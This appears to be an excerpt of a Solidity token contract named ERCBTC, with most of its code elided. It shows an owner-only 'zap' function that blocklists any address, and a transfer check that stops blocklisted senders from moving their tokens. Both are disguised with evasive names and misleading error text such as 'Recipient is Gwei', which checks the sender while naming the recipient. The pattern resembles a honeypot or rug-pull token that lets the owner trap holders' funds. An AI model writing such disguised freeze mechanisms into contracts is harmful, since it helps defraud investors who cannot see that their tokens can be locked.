...
contract ERCBTC is Context, IBEP20, Ownable {
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(!isBlocklisted[sender], "Recipient is Gwei");
  ...
  function zap(address _uzer) public onlyOwner {
        require(!isBlocklisted[_uzer], "user already Gwei-ed");
        isBlocklisted[_uzer] = true;
        // emit events as well
    }
   
  function dezap(address _uzer) public onlyOwner {
        require(isBlocklisted[_uzer], "user already whitelisted");
        isBlocklisted[_uzer] = false;
        // emit events as well
    }
